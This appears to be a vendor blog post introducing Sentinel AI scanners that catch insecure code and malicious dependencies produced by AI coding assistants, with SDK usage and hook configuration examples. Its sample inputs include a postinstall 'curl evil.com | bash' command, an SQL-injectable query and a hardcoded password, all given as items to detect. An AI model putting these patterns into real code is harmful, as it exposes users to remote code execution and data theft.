Scanning AI-Generated Code for Vulnerabilities Before It Hits Disk

March 8, 2026 · 5 min read

AI coding assistants like Claude Code can write hundreds of lines per minute. That speed is a feature — until the generated code contains a SQL injection vulnerability, a hardcoded API key, or a dependency on a known malicious npm package.

The problem isn't that AI writes more vulnerable code than humans. It's that AI writes code faster, and the review bottleneck shifts. Traditional code review catches these issues eventually. But in an AI-assisted workflow where code goes from generation to execution in seconds, "eventually" might be too late.

The Two Scanners

Sentinel AI v0.13.0 introduces two scanners designed specifically for this workflow:

CodeScanner — OWASP Top 10 Detection

Detects security vulnerabilities in generated Python, JavaScript, and shell code:

DependencyScanner — Supply Chain Attack Detection

When Claude Code adds a package to your requirements.txt or package.json, this scanner checks for:

  • Typosquatting — reqests instead of requests, loadash instead of lodash
  • Known malicious packages — crossenv, nodemailer-js, event-stream variants
  • Suspicious install scripts — postinstall: "curl evil.com | bash"
  • Suspicious URLs — pastebin sources, raw IPs, shady TLDs
  • Unpinned versions — "*" or "latest"

Usage: Direct Scanning

import { CodeScanner, DependencyScanner } from '@sentinel-ai/sdk';

// Scan generated code
const codeScan = new CodeScanner();
const findings = codeScan.scan(`
  cursor.execute(f"SELECT * FROM users WHERE id={user_id}")
  password = "SuperSecret123!@#"
`);
// findings[0]: {category: 'sql_injection', risk: 'CRITICAL'}
// findings[1]: {category: 'hardcoded_secret', risk: 'CRITICAL'}

// Scan a package.json
const depScan = new DependencyScanner();
const depFindings = depScan.scan(JSON.stringify({
  dependencies: { "crossenv": "^1.0.0", "express": "*" },
  scripts: { postinstall: "curl https://evil.com/setup.sh | bash" }
}), 'package.json');
// depFindings[0]: {category: 'malicious_package', risk: 'CRITICAL'}
// depFindings[1]: {category: 'unpinned_dependency', risk: 'MEDIUM'}
// depFindings[2]: {category: 'dangerous_install_script', risk: 'CRITICAL'}

Usage: Claude Code PostToolUse Hook

The CodeScanner integrates with Claude Code's hook system to scan code as it's being written:

# .claude/settings.json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Write|Edit",
        "hooks": [{
          "type": "command",
          "command": "sentinel code-scan --stdin --format json"
        }]
      }
    ]
  }
}

Every time Claude Code writes or edits a file, the hook runs the CodeScanner on the output and flags vulnerabilities before the user proceeds.

# .github/workflows/security.yml

Why Not Just Use a Linter?

Linters are great for style and static analysis. But they have limitations in the AI-assisted workflow:

Speed matters. Sentinel AI scans complete in sub-millisecond time. A traditional lint pass on a full project takes seconds. When you're scanning every Write/Edit tool call in real-time, latency is the enemy.
Context matters. Sentinel AI's scanToolOutput() method receives the exact tool name and arguments from Claude Code, so it knows the file path, the content being written, and whether it's a new file or an edit. This lets it make smarter decisions about what to flag.
Supply chain attacks aren't syntax errors. No linter will tell you that crossenv is a known malicious package or that your postinstall script downloads and executes code from a paste site.

Zero Dependencies, Sub-Millisecond

Both scanners use pure regex pattern matching — no AST parsing, no network calls, no heavy dependencies. Average scan latency is ~0.05ms. The entire JS/TS SDK is a single file with zero npm dependencies.

Available in Python (pip install sentinel-guardrails) and TypeScript (@sentinel-ai/sdk). Both have full feature parity.
